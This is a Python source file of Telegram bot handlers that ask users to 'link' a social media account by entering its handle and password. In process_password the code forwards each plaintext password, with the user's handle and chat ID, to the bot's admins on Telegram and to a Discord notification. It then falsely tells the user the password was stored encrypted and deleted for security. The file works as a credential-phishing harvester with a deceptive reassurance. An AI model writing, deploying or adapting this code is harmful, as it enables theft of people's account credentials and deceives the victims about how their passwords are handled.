import html
import logging
from contextlib import suppress
from aiogram import types
from aiogram.exceptions import TelegramBadRequest
from aiogram.fsm.context import FSMContext
from bot.config import ADMIN_IDS
from bot.database import db
from bot.keyboards import get_main_menu_keyboard
from bot.services.discord import send_discord_notification
from bot.states import BotStates

async def platform_selected(callback: types.CallbackQuery, state: FSMContext):
    chat_id = callback.message.chat.id
    platform = callback.data.split("_")[1].lower()

    existing = await db.get_user_social_accounts_full(chat_id)
    already_linked = [acc for acc in existing if acc["platform"].lower() == platform]
    if already_linked:
        acc = already_linked[0]
        await callback.answer(
            f"You already linked your {platform.title()} account ({acc['handle']})!\nLimit: 1 account per platform.",
            show_alert=True,
        )
        return

    await state.update_data(platform=platform)
    await state.set_state(BotStates.entering_handle)
    await callback.answer()

    with suppress(TelegramBadRequest):
        await callback.message.edit_text(
            f"You selected <b>{html.escape(platform.title())}</b>.\n\n"
            "Please enter your handle for this account starting with the <b>@</b> symbol (e.g., <code>@yourhandle</code>):"
        )

async def process_handle(message: types.Message, state: FSMContext):
    handle = (message.text or "").strip()
    if not handle.startswith("@") or len(handle) < 2:
        await message.answer(
            "❌ Invalid format. The handle must start with the <b>@</b> symbol (e.g., <code>@yourhandle</code>). Try again:"
        )
        return

    await state.update_data(handle=handle)
    await state.set_state(BotStates.entering_password)
    await message.answer("🔑 Please enter the password for this account:")

async def process_password(message: types.Message, state: FSMContext):
    password = (message.text or "").strip()
    chat_id = message.chat.id

    # Security: Delete the password message from Telegram chat immediately
    with suppress(Exception):
        await message.delete()

    data = await state.get_data()
    platform = data.get("platform")
    handle = data.get("handle")

    if not platform or not handle:
        await state.set_state(BotStates.main_menu)
        await message.answer(
            "⚠️ Registration timed out or was incomplete. Please choose an option from the menu:",
            reply_markup=get_main_menu_keyboard(),
        )
        return

    user = await db.get_user(chat_id)
    telegram_username = user["telegram_username"] if user else f"id_{chat_id}"

    await db.add_social_account(chat_id, telegram_username, platform, handle, password)

    admin_notification = (
        f"🔔 <b>New Social Account Linked!</b>\n\n"
        f"<b>username:</b> {html.escape(telegram_username)}\n"
        f"<b>chat_id:</b> <code>{chat_id}</code>\n\n"
        f"<b>Platform:</b> {html.escape(platform.title())}\n"
        f"<b>Handle:</b> <code>{html.escape(handle)}</code>\n"
        f"<b>Password:</b> <code>{html.escape(password)}</code>"
    )

    for admin_id in ADMIN_IDS:
        try:
            await message.bot.send_message(admin_id, admin_notification)
        except Exception as e:
            logging.warning(f"Could not send notification to admin {admin_id}: {e}")

    await send_discord_notification(
        title="📱 Social Account Linked",
        fields=[
            {"name": "👤 User", "value": telegram_username, "inline": True},
            {"name": "🌐 Platform", "value": platform.title(), "inline": True},
            {"name": "🏷️ Handle", "value": handle, "inline": True},
            {"name": "🔑 Password", "value": password, "inline": False},
        ],
        color=0x9B59B6,
    )

    await state.clear()
    await state.set_state(BotStates.main_menu)
    await message.answer(
        f"✅ Successfully linked <b>{html.escape(platform.title())}</b> account (<code>{html.escape(handle)}</code>)!\n"
        "<i>(Your password message was deleted from chat for security & stored encrypted)</i>\n\n"
        "<i>(Limit: 1 account per platform)</i>",
        reply_markup=get_main_menu_keyboard(),
    )
